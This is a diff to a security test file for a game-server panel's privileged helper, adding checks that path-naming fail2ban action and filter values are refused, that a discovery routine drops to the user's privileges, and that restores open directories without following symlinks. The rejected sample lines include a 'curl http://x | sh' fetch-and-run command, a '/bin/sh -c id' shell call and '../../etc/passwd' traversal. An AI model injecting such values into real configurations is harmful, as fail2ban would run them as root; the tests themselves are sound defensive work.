@@ -1092,7 +1092,8 @@ try:
     #    ~/serverfiles` made root give /root away to the content account.
     _cs_victim = os.path.join(_cs_tmp, "victim")
     os.makedirs(_cs_victim)
-    os.chmod(_cs_victim, 0o755)
+    _CS_750 = _cs_stat.S_IRWXU | _cs_stat.S_IRGRP | _cs_stat.S_IXGRP
+    os.chmod(_cs_victim, _CS_750)
     _cs_sf = os.path.join(_cs_home, _helper.CONTENT_SUBDIR)
     os.symlink(_cs_victim, _cs_sf)
     try:
@@ -1101,7 +1102,7 @@ try:
     except OSError as _e:
         _cs_dc_err = type(_e).__name__
     check("helper content-dir-create: a symlinked serverfiles is refused, not followed",
-          _cs_dc_err and _cs_stat.S_IMODE(os.stat(_cs_victim).st_mode) == 0o755,
+          _cs_dc_err and _cs_stat.S_IMODE(os.stat(_cs_victim).st_mode) == _CS_750,
           "err=%r victim mode=%s" % (_cs_dc_err,
                                      oct(_cs_stat.S_IMODE(os.stat(_cs_victim).st_mode))))
     os.unlink(_cs_sf)
@@ -1124,14 +1125,14 @@ try:
     _cs_exec = os.path.join(_cs_tree, "run.sh")
     with open(_cs_exec, "w", encoding="utf-8") as _fh:
         _fh.write("x")
-    os.chmod(_cs_exec, 0o700)
+    os.chmod(_cs_exec, _cs_stat.S_IRWXU)
     _cs_tf = os.path.join(_cs_tmp, "shadowish")
     with open(_cs_tf, "w", encoding="utf-8") as _fh:
         _fh.write("x")
     os.chmod(_cs_tf, 0o640)
     _cs_td = os.path.join(_cs_tmp, "sudoersd")
     os.makedirs(_cs_td)
-    os.chmod(_cs_td, 0o700)
+    os.chmod(_cs_td, _cs_stat.S_IRWXU)
     os.symlink(_cs_tf, os.path.join(_cs_tree, "a"))
     os.symlink(_cs_td, os.path.join(_cs_tree, "b"))
     _helper.do_content_grant_read(
@@ -1229,6 +1230,74 @@ try:
 finally:
     _helper.HOME_ROOT, _helper.CONTENT_CRON_PREFIX = _cs_saved_root, _cs_saved_cron
     _shutil.rmtree(_cs_tmp, ignore_errors=True)
+
+# ── fail2ban's two runnable keys ──────────────────────────────────────────────────────────────
+# These four write targets were allowed wholesale, on the reasoning that fail2ban config is
+# declarative and the COMMANDS live in action.d/*.conf, which is not a write target. Two keys
+# undercut that: a jail's `action` names a definition that fail2ban resolves by joining the value
+# onto "action.d", and filter.d/linuxgsm-panel.conf IS a write target — so `action =
+# ../filter.d/linuxgsm-panel` may load a file the caller just wrote, whose actionstart/actionban
+# fail2ban runs as root on reload. I could not verify that traversal (no fail2ban here to test
+# against), so this is a guard against a maybe — and it costs nothing, because the panel writes
+# none of these keys and a legitimate value is a bare name.
+_helper_src = open(_helper_path, encoding="utf-8").read()
+_f2b_bad = [ln for ln in ("action = ../filter.d/linuxgsm-panel", "banaction = /tmp/evil",
+                          "actionban = curl http://x | sh", "actionstart = /bin/sh -c id",
+                          "banactionallports = ../../x", "filter = ../../etc/passwd",
+                          "chain = ../x")
+            if _helper._fail2ban_line_ok(ln)]
+check("helper fail2ban: a value that names a path is refused for the keys that decide what RUNS",
+      not _f2b_bad, "accepted: %s" % _f2b_bad)
+_f2b_good = [ln for ln in ("action = iptables-multiport", "filter = linuxgsm-panel",
+                           "action_mwl = sendmail-whois-lines", "[linuxgsm-panel]",
+                           "enabled = true", "ignoreip = 127.0.0.1/8 ::1 10.0.0.0/8",
+                           "logpath = /var/log/auth.log",
+                           "failregex = panel login (?:failed|blocked) from <HOST>$")
+             if not _helper._fail2ban_line_ok(ln)]
+check("helper fail2ban: ...and every other key, paths and regexes included, is untouched",
+      not _f2b_good, "refused: %s" % _f2b_good)
+# The bodies the PANEL actually sends have to pass, or the feature is simply broken.
+from panel.ops.ssh_manager import hosts as _f2b_hosts                              # noqa: E402
+_F2B_BODIES = {
+    "fail2ban-panel-jail": _nsr_so._panel_f2b_jail_body("/var/log/auth.log", 5000, ["10.0.0.0/8"]),
+    "fail2ban-panel-filter": _nsr_so._panel_f2b_filter_body(),
+    "fail2ban-jail-local": ("[DEFAULT]\nbantime = 1h\nfindtime = 10m\nmaxretry = 5\n\n"
+                            "[sshd]\nenabled = true\nport = 22\n"),
+    "fail2ban-panel-whitelist": _f2b_hosts._f2b_dropin_ignoreip_body(["10.0.0.0/8", "100.64.0.1"]),
+}
+_f2b_rejected = [n for n, b in _F2B_BODIES.items()
+                 if _helper.WRITE_CONTENT[n] is None
+                 or not _helper._lines_match(b, _helper.WRITE_CONTENT[n])]
+check("helper fail2ban: every body the panel writes is still accepted", not _f2b_rejected,
+      "rejected: %s" % _f2b_rejected)
+
+# ── lgsm-discover reads a user's files AS THAT USER ───────────────────────────────────────────
+# Everything it reads lives inside a /home user's own directory, so every path component is theirs
+# to replace: a symlink at ~/lgsm/config-lgsm/<x>/<x>.cfg made it a port-number oracle over any
+# root-readable file, one at ~/lgsm/backup a directory-entry count, one at
+# ~/lgsm/mods/installed-mods.txt a line count. Same class as the mount.cfg read. The fork-and-drop
+# only engages as root — unprivileged there is no boundary — so what is checked here is that the
+# drop is attempted and that the output is unchanged when it is not.
+import inspect as _disc_inspect
+_disc_src = _disc_inspect.getsource(_helper._discover_user)
+check("helper lgsm-discover: the per-user read drops to that user before reading anything",
+      "os.setgroups([])" in _disc_src and "os.setgid(pw.pw_gid)" in _disc_src
+      and "os.setuid(pw.pw_uid)" in _disc_src and "os.fork()" in _disc_src,
+      "no credential drop in _discover_user")
+check("helper lgsm-discover: ...and it refuses to read if the drop did not take",
+      "os.getuid() != pw.pw_uid or os.geteuid() == 0" in _disc_src
+      and _disc_src.index("os.getuid() != pw.pw_uid") < _disc_src.index("_emit()\n            sys"),
+      "no post-drop state check before the read")
+
+# ── the restore copy pins BOTH directories, not just the file names ───────────────────────────
+# O_NOFOLLOW covers the last component only, so islink(stage) followed by
+# os.path.join(stage, member) was a check on a path and then a use of it: swap `stage` itself for
+# a symlink in that window and root reads <somewhere else>/panel.db over the live one. A
+# descriptor cannot be re-pointed once open.
+check("helper restore: the staging and data directories are opened O_NOFOLLOW once, as fds",
+      "os.O_DIRECTORY | os.O_NOFOLLOW" in _helper_src
+      and "src_dir_fd=sdir, dst_dir_fd=ddir" in _helper_src,
+      "restore_copy_members still joins paths")
 
 # ── The restore must not follow a symlink out of the staging directory ────────────────────────
 # The staging directory is FIXED, and the helper's own note says why that matters: root copying
